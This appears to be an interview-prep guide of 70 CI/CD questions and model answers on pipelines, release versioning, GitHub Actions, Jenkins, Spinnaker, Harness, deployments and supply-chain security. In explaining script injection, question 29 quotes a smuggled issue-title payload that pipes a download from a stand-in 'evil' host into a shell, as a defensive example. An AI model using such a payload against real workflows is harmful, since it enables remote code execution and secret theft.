# CI/CD interview questions (70) with model answers

Answer shape that works: **definition in one line → how you'd do it → trade-off or failure mode → a real example**. Files in this repo are referenced so you can show, not just tell.

Sections: [Fundamentals](#fundamentals-1-10) · [Release and versioning](#release-and-versioning-11-20) · [GitHub Actions](#github-actions-21-30) · [Jenkins](#jenkins-31-42) · [Spinnaker](#spinnaker-43-49) · [Harness](#harness-50-55) · [Deployment strategies](#deployment-strategies-56-61) · [Security](#security-62-64) · [Scenarios](#scenarios-65-70) · [Rapid fire](#rapid-fire)

---

## Fundamentals (1-10)

**1. Continuous integration vs continuous delivery vs continuous deployment?**
CI: every change is merged to the mainline often and verified by an automated build and tests. Continuous delivery: every green build is *releasable* — deploying to prod is a business decision (a button or approval). Continuous deployment: every green build goes to prod automatically, no human gate. This repo's Jenkins pipeline is continuous delivery (`DEPLOY_PROD` + `input`); a team with strong canary analysis can remove the gate.

**2. What does a good pipeline look like?**
Fast feedback first, expensive checks later: compile + unit tests (minutes) → static analysis/security in parallel → package once → deploy to staging + smoke/integration tests → progressive prod rollout with automated verification → easy rollback. It's defined as code, reproducible, and every artifact is traceable to a commit. Target: commit-to-feedback under 10 minutes.

**3. What is "build once, promote everywhere" and why does it matter?**
Build the artifact (jar, image) once and move the same bytes through staging → prod; only configuration changes per environment. Rebuilding per environment means prod runs something you never tested (different dependency resolved, different base image). Promote images by digest. See `docs/RELEASE_STRATEGY.md`.

**4. How do you measure delivery performance?**
DORA metrics: deployment frequency, lead time for changes (commit → prod), change failure rate, and failed-deployment recovery time (formerly MTTR). Elite teams deploy on demand with lead time under a day. Use them to find bottlenecks, never as individual performance targets.

**5. The pipeline takes 40 minutes. How do you speed it up?**
Measure first (stage timings). Then: cache dependencies and build outputs (Gradle build cache, `setup-gradle`, Docker layer cache), run independent stages in parallel, split/shard tests, run only affected modules in a monorepo, move slow end-to-end suites off the PR path to a post-merge or nightly stage, use bigger or warm runners, and avoid rebuilding the artifact in later stages.

**6. How do you deal with flaky tests?**
Treat as bugs: detect (rerun-on-failure stats, test analytics), quarantine with a ticket and owner so the pipeline stays trustworthy, fix root causes (time, ordering, shared state, real network, async waits — use Awaitility instead of `sleep`), and never "just rerun" as policy. A pipeline people don't trust gets bypassed.

**7. Where do artifacts live?**
In an artifact repository — Artifactory, Nexus, GitHub Packages, ECR/GHCR for images — never only on the CI server. Releases are immutable (no overwriting `1.2.0`), snapshots are cleaned up by retention policy, and everything carries the commit SHA. This repo's jar embeds version + commit (`/api/version`).

**8. How do you handle environment-specific configuration?**
Externalise it (12-factor): env vars, ConfigMaps, Spring profiles, a config service, secrets from a vault. The artifact contains no environment URLs or secrets. Config changes should also be versioned and reviewed, ideally deployed through the same pipeline.

**9. CI for a monorepo?**
Path filters or a build graph so only affected projects build and test (Gradle/Bazel/Nx affected targets, `paths:` filters in Actions), shared caching, code owners per directory, and separate deploy pipelines per service so one team's red build doesn't block everyone.

**10. Why pipeline as code?**
Reviewed in PRs, versioned with the app (a branch can change its own pipeline), reproducible after a disaster, consistent via shared libraries/templates. UI-configured jobs drift and nobody knows why they work. Here: `Jenkinsfile`, `jenkins/jobs.groovy`, `jenkins/casc.yaml`, workflows, Spinnaker JSON, Harness YAML.

## Release and versioning (11-20)

**11. Explain semantic versioning.**
MAJOR.MINOR.PATCH: major for incompatible API changes, minor for backward-compatible features, patch for backward-compatible fixes. Pre-release `1.4.0-rc.1` sorts before `1.4.0`; build metadata `+abc` doesn't affect ordering. `scripts/next-version.sh` maps Conventional Commits onto it.

**12. Annotated vs lightweight tags?**
Lightweight is just a ref to a commit. Annotated is a full Git object with tagger, date, message and optional signature; `git describe` and `git push --follow-tags` use annotated tags. Always annotate releases — `release.sh` stores the release notes in the annotation and `release.yml` refuses non-annotated tags.

**13. How do you decide the next version automatically?**
Conventional Commits (`feat:`, `fix:`, `feat!:` / `BREAKING CHANGE:`) since the last tag → semver bump. Tools: semantic-release, release-please (opens a release PR), or a small script like ours. Enforce the commit format with commitlint in CI or squash-merge PR titles.

**14. Tag vs GitHub Release?**
A tag is Git data (a name for a commit). A GitHub Release is GitHub metadata on top of a tag: title, notes, downloadable assets, pre-release/latest flags, and optional immutability. `release.yml` creates one with `gh release create --verify-tag` and attaches jar + checksum.

**15. Someone force-moved tag v2.3.0 to a different commit. What breaks?**
Anyone who already fetched it keeps the old commit (Git doesn't update existing tags on fetch), so "v2.3.0" now means two different things; caches, Go module proxies and checksums fail; provenance no longer matches. Fix: restore it, ship the change as v2.3.1, and add a tag ruleset blocking update/delete of `v*`.

**16. How do you ship a hotfix with trunk-based development?**
Fix on `main`, release `vX.Y.Z+1` through the normal pipeline (fast because the pipeline is fast). If `main` contains unreleasable work, branch from the release tag, cherry-pick the fix, tag there, and make sure the fix is on `main` too. Feature flags reduce how often that's needed.

**17. Release branches or trunk-based?**
Trunk-based with short-lived branches and flags for services you deploy continuously. Release branches when you support several versions in the field (on-prem, SDKs, mobile) — fixes are cherry-picked to each supported branch. GitFlow is usually too heavy for continuously delivered services.

**18. How are changelogs produced?**
Generated, not hand-written: from Conventional Commits (our `release.sh` groups Breaking / Features / Fixes) or from merged PR titles and labels (GitHub `--generate-notes` with `.github/release.yml` categories). Humans edit highlights for user-facing releases.

**19. How do you know what version is running in prod?**
Bake version + commit into the artifact at build time (Spring Boot `buildInfo` → `BuildProperties`), expose it (`/api/version`, `/actuator/info`), label images (`org.opencontainers.image.revision`), and record deployments (Spinnaker/Harness execution history, deployment markers in APM).

**20. Your release workflow pushes a tag with `GITHUB_TOKEN`, but the tag-triggered workflow never runs. Why?**
Events created with `GITHUB_TOKEN` don't start new workflow runs (except `workflow_dispatch`/`repository_dispatch`), to prevent recursive loops. Use a GitHub App installation token, call the release job in the same workflow, or trigger with `workflow_dispatch`.

## GitHub Actions (21-30)

**21. Explain workflow, job, step, runner, action.**
A workflow (YAML in `.github/workflows`) is triggered by events. It has jobs that run in parallel by default (`needs:` orders them), each on a fresh runner (GitHub-hosted or self-hosted). Jobs have steps: shell commands (`run:`) or actions (`uses:`, reusable units in JavaScript, Docker or composite form).

**22. How do you share CI logic across many repos?**
Reusable workflows (`on: workflow_call`, called as a whole job, can declare secrets and inputs) for full pipelines; composite actions for a group of steps; org-level required workflows/rulesets to enforce them; starter workflows for new repos.

**23. How should a workflow authenticate to AWS?**
OIDC: `permissions: id-token: write`, `aws-actions/configure-aws-credentials` with `role-to-assume`; the IAM role's trust policy restricts `sub` to the repo and branch/environment. No access keys stored, credentials expire in an hour.

**24. How do you gate production deploys in Actions?**
Environments: required reviewers (with prevent self-review), wait timers, deployment branch/tag rules, and environment-scoped secrets that only exist after approval. The job declares `environment: prod`.

**25. Matrix builds?**
`strategy.matrix` expands a job over combinations (Java 17/21 × OS); `include`/`exclude` adjust, `fail-fast` controls cancellation, `max-parallel` limits concurrency. Jenkins equivalent: `matrix { axes {} }`.

**26. Caching and concurrency?**
`gradle/actions/setup-gradle` (or `actions/cache` keyed on lockfiles) restores dependency and build caches; Docker uses `cache-from/to: type=gha`. `concurrency:` with `cancel-in-progress: true` cancels superseded PR runs; for deploys use `cancel-in-progress: false` so a deployment isn't killed halfway (see `ci.yml` vs `release.yml`).

**27. What permissions does `GITHUB_TOKEN` get?**
Configurable; new repos/orgs default to read-only. Declare `permissions:` at workflow level (least privilege, here `contents: read`) and widen per job. The token expires when the job ends and is scoped to the repo.

**28. `pull_request` vs `pull_request_target`?**
`pull_request` runs the PR's code in the context of the merge commit without secrets for forks and with a read-only token — safe for untrusted code. `pull_request_target` runs the *base* branch's workflow with secrets and a write token; checking out and executing the PR's code there gives attackers your secrets ("pwn request"). Use it only for labelling/commenting without running PR code.

**29. What is script injection in Actions?**
`${{ }}` expressions are substituted into the script *before* the shell runs, so `run: echo "${{ github.event.issue.title }}"` with a title like `"; curl evil | sh; "` executes it. Pass untrusted input via `env:` and reference `"$VAR"`. This repo only uses `${{ }}` in `env:` blocks and action inputs.

**30. Why pin actions to a commit SHA?**
Tags like `@v4` are mutable — if the action's repo is compromised the tag can be moved to malicious code (the March 2025 `tj-actions/changed-files` incident exfiltrated secrets this way). A full SHA is immutable; Dependabot/Renovate keep SHAs current and add the version as a comment. This repo uses major tags for readability; in production I'd pin SHAs for third-party actions at least.

## Jenkins (31-42)

**31. Declarative vs scripted pipeline?**
Declarative (`pipeline { agent; stages; post }`) is structured, validated up front, has `when`, `options`, `post`, `parallel`, `matrix`, and restart-from-stage; use it by default. Scripted (`node { }`) is plain Groovy — more flexible, easier to make unmaintainable. Escape hatch inside declarative: `script { }` blocks, or move logic into shared libraries.

**32. Jenkins architecture?**
Controller (UI, scheduling, config, build records in `$JENKINS_HOME`) and agents (run builds; connected via inbound/JNLP or SSH, static or ephemeral like Kubernetes pods). Executors are build slots. Production: 0 executors on the controller, labels to route work, ephemeral agents for isolation and scaling.

**33. What is a shared library and how is it structured?**
A Git repo (or path) loaded with `@Library('name') _`. `vars/foo.groovy` defines global steps (`def call(...)`, used as `foo(...)`), `src/` holds Groovy classes, `resources/` holds files read by `libraryResource`. Version it with tags/branches (`@Library('lib@v2')`). Here: `jenkins/shared-library/vars/{semver,deployApp,smokeTest,stopApp}.groovy`, loaded via JCasC with `libraryPath`.

**34. What is CPS, and what does `@NonCPS` do?**
Pipeline Groovy runs in a continuation-passing-style interpreter so the build can survive controller restarts — every local variable must be serialisable and some Groovy (closures over iterators, `.each` on some collections, non-serialisable objects like `Matcher`) misbehaves. `@NonCPS` methods run as normal Groovy (fast, no persistence), but can't call pipeline steps. Keep heavy logic out of Groovy: call a script with `sh`.

**35. How do you use credentials safely in Jenkins?**
Store them in the Credentials store scoped to a folder; bind with `environment { TOKEN = credentials('id') }` or `withCredentials`. Use single-quoted `sh 'curl -H "Authorization: Bearer $TOKEN" ...'` so the shell, not Groovy, expands it — Groovy interpolation leaks secrets into process args and Jenkins prints a warning. Our `deployApp`/`smokeTest` pass values through `withEnv` and single-quoted scripts for the same reason.

**36. Problem with an `input` step in a declarative pipeline?**
If the stage holds an agent, the executor (and workspace) is blocked while waiting for a human, possibly for hours. Use `agent none` for the approval stage (or the stage-level `input` directive, which is evaluated before the agent is allocated), wrap in `timeout`, restrict `submitter`, and add `milestone` so older builds can't be approved after newer ones.

**37. Multibranch pipelines and triggers?**
Multibranch (and Organization Folders) discover branches/PRs with a `Jenkinsfile` and create jobs automatically; deleted branches are cleaned up. Trigger by webhooks (GitHub app/webhook → immediate) rather than SCM polling (load on Git server, delay). PR builds report status checks back to GitHub.

**38. How do you manage Jenkins itself as code?**
JCasC (`casc.yaml`) for system config, security realm, credentials (from env/secret files), clouds and global libraries; Job DSL or multibranch/org folders for jobs; plugins pinned in `plugins.txt` and baked into a Docker image. The controller becomes cattle: rebuild from Git. That is exactly `jenkins/` in this repo.

**39. `stash`/`unstash` vs `archiveArtifacts`?**
`stash` moves files between stages/agents within one build and is discarded afterwards. `archiveArtifacts` keeps files with the build record for download (with `fingerprint: true` to track where an artifact was used). Real releases go to an artifact repository, not Jenkins.

**40. Parallel and matrix in declarative?**
`parallel { stage('a') {...} stage('b') {...} }` runs stages concurrently (`failFast true` aborts siblings on failure); `matrix { axes { axis { name 'JDK'; values '17','21' } } stages {...} }` generates combinations. Our quality-gate stage runs the release-script self-test and coverage check in parallel.

**41. The Jenkins controller is a single point of failure. What do you do?**
Open-source Jenkins has no active-active HA. Mitigate: config as code + image so it can be rebuilt in minutes, `$JENKINS_HOME` on persistent storage with backups, ephemeral agents so builds aren't tied to it, split giant controllers by team, monitor (Prometheus plugin). Commercial options (CloudBees HA) exist; many teams move CI to SaaS instead.

**42. How do Jenkins agents on Kubernetes work?**
The Kubernetes plugin creates a pod per build from a pod template (`agent { kubernetes { yaml '...' } }`) with a JNLP container plus tool containers (`container('gradle') { sh ... }`), and deletes it afterwards. Clean environment every time, scales to zero, isolation between builds; watch image pull time and cache dependencies via PVCs or a remote build cache.

## Spinnaker (43-49)

**43. What is Spinnaker?**
An open-source multi-cloud continuous delivery platform created at Netflix (now CD Foundation). It focuses on deployment: pipelines of stages (deploy, manual judgment, canary analysis, run job, webhook) with built-in strategies and rollbacks across Kubernetes, AWS, GCP, Azure. Built as microservices: Deck (UI), Gate (API gateway), Orca (orchestration), Clouddriver (cloud operations and caching), Front50 (pipeline/app metadata), Igor (CI and SCM integration), Echo (triggers and notifications), Rosco (image baking), Kayenta (canary), Fiat (authorization).

**44. Spinnaker's core concepts?**
Application (a service and its resources), cluster (logical group of server groups), server group (a versioned deployable unit — ASG or ReplicaSet/Deployment), load balancer and firewall. Pipelines have triggers, parameters, expected artifacts and stages; executions are recorded with who/what/when.

**45. Spinnaker deployment strategies?**
Red/black (= blue/green: deploy new server group, shift traffic, disable old but keep it for instant rollback), highlander (new one up, destroy all old), rolling red/black (shift traffic in percentages), and canary with Kayenta. For Kubernetes manifests, strategies are set via annotations or traffic management on the deploy stage.

**46. How does Kayenta canary analysis work?**
Deploy baseline (old version) and canary (new) side by side with equal size, collect the same metrics from both (Prometheus, Datadog, Stackdriver, New Relic), compare with statistical tests (Mann-Whitney U) per metric, produce a score 0–100; pass/marginal thresholds decide promote, wait or roll back. See stage `kayentaCanary` in `spinnaker/pipeline.json`.

**47. How do Jenkins and Spinnaker work together?**
Jenkins (CI) builds and publishes the image/artifact; Spinnaker's Igor polls Jenkins (or a Docker registry/Git trigger fires) and starts a pipeline with that artifact as the trigger's expected artifact. Spinnaker can also call Jenkins jobs as stages (e.g. run integration tests) and read their properties files back.

**48. What are pipeline expressions and manual judgment?**
SpEL expressions (`${trigger.tag}`, `${parameters.skipCanary}`, `${#judgment('stage')}`, `${#stage('Deploy')['context']}`) make stages dynamic and conditional. A Manual Judgment stage pauses for a human choice (restricted to roles), and later stages can branch on the selected option, as in our prod deploy stage.

**49. Why do some companies move off Spinnaker?**
Operational cost (around ten services, Redis, SQL, many configs; Halyard/Operator upgrades), steep learning curve, JSON pipeline sprawl, and Kubernetes-only teams finding Argo CD + Argo Rollouts simpler. It remains strong for large multi-cloud, multi-account estates with standardised canary/red-black.

## Harness (50-55)

**50. What is Harness and how does it reach your infrastructure?**
A commercial software delivery platform (CD, CI, Feature Flags, Continuous Verification, security testing, cloud cost, chaos engineering). The SaaS control plane orchestrates; a **Delegate** — a small service you run in your cluster/VPC — makes **outbound** connections to Harness, pulls tasks and executes them with local network access and credentials, so you don't open inbound firewall holes.

**51. Harness building blocks?**
Pipelines → stages (CI, Deployment, Approval, Custom) → steps and step groups. A Deployment stage combines a **Service** (what: manifests + artifact), an **Environment** (where: prod/non-prod, overrides) and an **Infrastructure Definition** (the actual cluster/namespace). **Connectors** hold integrations (GitHub, Docker registry, Kubernetes, AWS) and reference secrets from a secret manager.

**52. What is Continuous Verification?**
Harness compares metrics and logs from APM/logging tools (Prometheus, Datadog, AppDynamics, Splunk, ELK…) for the new deployment against the baseline using ML, flags anomalies and fails the step, triggering rollback. It's the Harness counterpart of Kayenta; see the `Verify` step in `harness/pipeline.yaml`.

**53. How do failure strategies and rollback work in Harness?**
Each step/stage has failure strategies per error type: retry, mark as success, manual intervention, abort, stage rollback or pipeline rollback. `rollbackSteps` define what runs on rollback (e.g. `K8sCanaryDelete`, `K8sRollingRollback`). Rollback returns the previous successful release of the service in that infrastructure.

**54. How does Harness handle governance at scale?**
Templates (versioned pipeline/stage/step templates teams must use), OPA policies (e.g. "prod stages must have an approval", "only images from our registry"), RBAC with resource groups, audit trail, freeze windows, and Git Experience so pipelines live in repos and change through PRs.

**55. What are Harness expressions?**
`<+...>` runtime expressions: `<+pipeline.sequenceId>`, `<+codebase.tag>`, `<+serviceConfig.artifacts.primary.tag>`, `<+secrets.getValue("id")>`, `<+input>` for runtime inputs with `.default()` / `.allowedValues()`. Our pipeline strips the `v` with `<+codebase.tag.replace("v","")>` so the image tag matches the semver.

## Deployment strategies (56-61)

**56. Rolling vs blue/green vs canary?**
Rolling replaces instances in batches — no extra infra, but the bad version reaches everyone gradually and two versions coexist. Blue/green stands up a full new stack and switches all traffic — instant rollback, double capacity, everyone switches at once. Canary sends a small slice of traffic first and widens after metrics confirm — smallest blast radius, needs good observability. Table in `docs/DEPLOYMENT_STRATEGIES.md`.

**57. Why compare the canary to a new baseline rather than the existing fleet?**
Long-running pods differ from fresh ones (warm caches, JIT, memory growth, connection pools), so canary-vs-stable differences can be startup effects. Spinnaker/Kayenta deploys a baseline of the old version alongside the canary at the same size and time for a fair comparison.

**58. Canary or feature flag?**
Canary protects against *deployment* risk (the new build is broken: crashes, latency, errors) across all its code. Feature flags protect against *release* risk of a specific feature and allow targeting (internal users, tenants, %), instant off without redeploy. Use both: deploy via canary, then release features with flags.

**59. How do you change the database schema with zero downtime?**
Expand/contract: add new nullable column → deploy code writing both → backfill → read new → stop writing old → drop old in a later release. Each step is backward compatible so old and new app versions (rolling, blue/green, rollback) all work. Flyway/Liquibase version the migrations; avoid long table locks (online DDL, batches).

**60. Rollback or roll forward?**
Roll back when the previous artifact is still compatible (no irreversible data/schema/message change) — it's fastest. Roll forward when data has changed shape or the fix is trivial and the pipeline is fast. Design so rollback is always available: compatible migrations and event schemas, flags, keeping the previous release deployable.

**61. What makes a Kubernetes rolling update safe?**
Readiness probes (no traffic until ready), `maxUnavailable: 0` + `maxSurge: 1`, graceful shutdown on SIGTERM with `terminationGracePeriodSeconds` > drain time, PodDisruptionBudget, enough replicas, `minReadySeconds`, and `progressDeadlineSeconds` + `kubectl rollout status` so the pipeline fails (and can `rollout undo`) on a stuck rollout.

## Security (62-64)

**62. What is software supply-chain security in CI/CD?**
Guaranteeing that what runs in prod came from reviewed source via a trusted build: protected branches and tags, pinned dependencies and actions, isolated ephemeral builders, SLSA provenance (`actions/attest-build-provenance` here), signed images (cosign) verified at admission, SBOMs and vulnerability scanning, least-privilege short-lived credentials. Details in `docs/PIPELINE_SECURITY.md`.

**63. A secret appeared in a public build log. What do you do?**
Revoke/rotate immediately (assume it's compromised — logs are scraped within minutes), check audit logs for use, delete the log, then fix the cause (Groovy interpolation, `set -x`, a tool echoing env). Prevent: OIDC instead of static keys, secret scanning, single-quoted shell, masking.

**64. How do you stop someone deploying unreviewed code?**
Branch protection/rulesets on `main` (PR review, required checks, no force push), tag rulesets so only the release process creates `v*`, deploys only from tags/main (environment branch rules), approvals by someone other than the author, signed artifacts verified at deploy, and audit logs.

## Scenarios (65-70)

**65. Design the pipeline for a new Spring Boot microservice from commit to prod.**
PR: build, unit tests, static analysis, dependency and secret scan, preview of the next version (all < 10 min). Merge to main: same + integration tests (Testcontainers), build image once, push with commit tag, deploy to staging, smoke + contract tests. Release: tag → GitHub Release with provenance → deploy to prod via canary with automated metric analysis → full rollout → auto rollback on failure. Config in env/ConfigMaps, secrets from a vault via OIDC, DB migrations expand/contract, flags for risky features, DORA metrics tracked. Walk through this repo's files as the example.

**66. The canary at 5% shows error rate 2% vs 0.3% baseline. Walk me through it.**
Stop promotion (automated analysis should already fail it), shift traffic away / roll back the canary, confirm errors drop. Then diagnose with the canary's labelled logs and traces: which endpoint, which exception, new dependency or config? Reproduce in staging, fix, add a test, and check why staging didn't catch it (missing data shape, traffic pattern). The canary did its job: 5% of users for minutes instead of 100%.

**67. Migrate 200 Jenkins jobs to GitHub Actions.**
Inventory and group jobs by pattern (most are variants of a few), build reusable workflows for those patterns first, migrate a pilot team, use `gh actions-importer` to draft conversions, run both in parallel until results match, then disable the Jenkins job. Plan secrets (OIDC), self-hosted runners for private networks, artifact storage, and the long tail of special jobs. Measure build time and failure rate before/after.

**68. Fifty microservices — how do you keep pipelines consistent?**
Golden path: a shared library / reusable workflow / Harness template every service uses, parameterised (language, deploy target); policies that enforce required stages (OPA in Harness, required workflows/rulesets in GitHub); a service template repo; central upgrades by bumping the library version; exceptions are explicit and reviewed.

**69. A feature needs coordinated changes in three services. How do you release it?**
Avoid lockstep deploys: make each change backward compatible (tolerant readers, new optional fields, versioned APIs/events), deploy providers before consumers, hide the behaviour behind a flag, verify with contract tests (Pact), then enable the flag gradually. Each service keeps its own pipeline and can roll back independently.

**70. Tests pass locally but fail in CI. How do you approach it?**
Find what differs: JDK/tool versions (toolchains, pinned images), env vars and locale/timezone, test ordering and parallelism, file system case sensitivity, network access, resources/timeouts, leftover state on a non-ephemeral agent. Reproduce in the CI image locally (`docker run` the same image), add logging, and fix the non-determinism rather than retrying.

---

## Rapid fire

- **Idempotent deploy?** Running it twice gives the same result (`kubectl apply`, Terraform) — safe retries.
- **Immutable infrastructure?** Replace instances/images instead of patching them in place.
- **GitOps?** Git is the desired state; an in-cluster agent pulls and reconciles (Argo CD, Flux).
- **Trunk-based development?** Everyone integrates to main at least daily; short branches; flags for unfinished work.
- **Smoke test?** Minimal post-deploy check that the service is up and wired (`smokeTest.groovy`: health + version).
- **Quality gate?** Automated pass/fail criteria (tests, coverage, vulnerabilities) a build must meet to proceed.
- **Artifact fingerprinting (Jenkins)?** MD5 tracking of an archived file across jobs/builds.
- **`--follow-tags`?** Pushes annotated tags reachable from the pushed commits along with the branch.
- **`git describe --tags`?** Nearest tag + commits since + short SHA, e.g. `v1.2.0-3-gabc1234`.
- **Highlander (Spinnaker)?** "There can be only one": destroy all previous server groups after deploy.
- **Delegate (Harness)?** Agent in your network that executes tasks via outbound connection.
- **Kayenta?** Spinnaker's automated canary analysis service.
- **JCasC?** Jenkins Configuration as Code plugin — YAML for the whole controller config.
- **Job DSL?** Groovy DSL that generates Jenkins jobs from code (`jenkins/jobs.groovy`).
- **Blue Ocean?** Old Jenkins UI, no longer actively developed; Pipeline Graph View / Stage View instead.
- **Reusable workflow vs composite action?** Whole job(s) with own runners vs a bundle of steps inside your job.
- **Environment in Actions?** Deployment target with protection rules and scoped secrets.
- **SLSA?** Supply-chain Levels for Software Artifacts — framework for build integrity and provenance.
- **SBOM?** Software Bill of Materials — list of components (CycloneDX, SPDX).
- **DORA "elite"?** On-demand deploys, lead time < 1 day, low change failure rate, recovery < 1 hour.
